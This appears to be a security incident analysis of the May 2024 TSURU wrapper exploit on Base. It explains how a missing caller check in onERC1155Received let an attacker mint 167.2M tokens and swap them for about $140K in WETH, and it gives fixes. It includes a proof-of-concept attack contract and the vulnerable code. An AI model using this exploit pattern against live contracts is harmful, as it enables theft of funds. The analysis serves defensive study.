# TSURU — Missing Caller Validation in onERC1155Received Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | TSURU |
| **Chain** | Base |
| **Loss** | ~$140,000 |
| **Attacker** | [0x7A5Eb99C](https://basescan.org/address/0x7A5Eb99C993f4C075c222F9327AbC7426cFaE386) |
| **Attack Contract** | [0xa2209b48](https://basescan.org/address/0xa2209b48506c4e7f3a879ec1c1c2c4ee16c2c017) |
| **Vulnerable Contract** | [Tsuru Wrapper 0x75Ac62EA](https://basescan.org/address/0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA) |
| **WETH** | [0x42000000](https://basescan.org/address/0x4200000000000000000000000000000000000006) |
| **Root Cause** | The `onERC1155Received()` callback does not validate the caller, allowing the attacker to invoke the callback directly without an actual ERC1155 transfer to mint 167.2M TSURU tokens and swap them for WETH |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/TSURU_exp.sol) |

---

## 1. Vulnerability Overview

The `onERC1155Received()` function in the TSURU Wrapper contract is a callback that mints TSURU tokens upon receiving ERC1155 tokens. Because the function does not validate whether `msg.sender` is a trusted ERC1155 contract, the attacker called it directly with arbitrary parameters to mint 167.2M TSURU. The minted tokens were then swapped for WETH via a Uniswap V3 pool, draining approximately 137.9 ETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: no caller validation in onERC1155Received
contract TsuruWrapper {
    address public erc1155Token;

    // Callback invoked by ERC1155 safeTransferFrom
    // However, anyone can call this directly
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        // No msg.sender validation — attacker can call directly
        // Mints TSURU proportional to value
        _mint(from, value * MINT_RATIO);
        return this.onERC1155Received.selector;
    }
}

// ✅ Safe code: validates that the caller is a trusted ERC1155 contract
function onERC1155Received(
    address operator,
    address from,
    uint256 id,
    uint256 value,
    bytes calldata data
) external returns (bytes4) {
    require(msg.sender == erc1155Token, "caller not erc1155 token");
    _mint(from, value * MINT_RATIO);
    return this.onERC1155Received.selector;
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: TSURUWrapper.sol
    function onERC1155Received(
        address,
        address from,
        uint256 id,
        uint256 amount,
        bytes calldata
    ) external override nonReentrant returns (bytes4) {
        require(id == tokenID, "Token ID does not match");
        
        if (msg.sender == address(erc1155Contract)) {
            return this.onERC1155Received.selector;
        }

        _safeMint(from, amount * ERC1155_RATIO); // Adjust minting based on the ERC1155_RATIO  // ❌ Vulnerability
        return this.onERC1155Received.selector;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] TsuruWrapper.onERC1155Received(
  │         operator = attacker,
  │         from     = attacker,
  │         id       = 0,
  │         value    = 167_200_000,  ← arbitrary mint amount specified
  │         data     = ""
  │       )
  │         └─ No msg.sender validation → _mint(attacker, 167.2M TSURU)
  │
  ├─→ [2] Uniswap V3 Pool.swap(TSURU → WETH)
  │         └─ 167.2M TSURU → ~137.9 WETH
  │
  └─→ [3] ~$140K worth of WETH drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IWrapper {
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4);
}

interface IUniswapV3Pool {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract AttackContract {
    IWrapper       constant wrapper = IWrapper(0x75Ac62EA5D058A7F88f0C3a5F8f73195277c93dA);
    IUniswapV3Pool constant pool    = IUniswapV3Pool(/* TSURU/WETH V3 pool */);
    IERC20 constant TSURU = IERC20(/* TSURU token */);
    IERC20 constant WETH  = IERC20(0x4200000000000000000000000000000000000006);

    function testExploit() external {
        // [1] Call onERC1155Received directly (no caller validation)
        wrapper.onERC1155Received(
            address(this),    // operator
            address(this),    // from (mint recipient)
            0,                // id
            167_200_000e18,   // value → mint 167.2M TSURU
            ""
        );

        // [2] Swap minted TSURU → WETH
        uint256 tsurubBal = TSURU.balanceOf(address(this));
        TSURU.approve(address(pool), tsurubBal);
        pool.swap(
            address(this),
            true,              // TSURU → WETH direction
            int256(tsurubBal),
            MIN_SQRT_RATIO + 1,
            ""
        );
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes calldata) external {
        if (amount0Delta > 0) {
            TSURU.transfer(address(pool), uint256(amount0Delta));
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Missing callback caller validation (onERC1155Received) |
| **CWE** | CWE-346: Origin Validation Error |
| **Attack Vector** | External (direct call to onERC1155Received) |
| **DApp Category** | ERC1155 wrapper / token minting contract |
| **Impact** | Unlimited TSURU minting → WETH drained (~$140K) |

## 6. Remediation Recommendations

1. **Mandatory caller validation**: Add `require(msg.sender == erc1155Token, "not erc1155")`
2. **Trusted token allowlist**: Only permit callbacks from approved ERC1155 contracts
3. **Mint cap**: Limit the maximum TSURU mintable in a single callback invocation
4. **TSURU cumulative mint monitoring**: Detect anomalous minting patterns

## 7. Lessons Learned

- Callbacks such as `onERC721Received` and `onERC1155Received` must always validate that `msg.sender` is a trusted contract.
- Analogous to MixedSwapRouter's `algebraSwapCallback`, missing caller validation in callback functions is a recurring pattern.
- When designing ERC1155 wrappers, mint logic triggered via callbacks must always be designed with the assumption that the callback can be invoked directly from outside.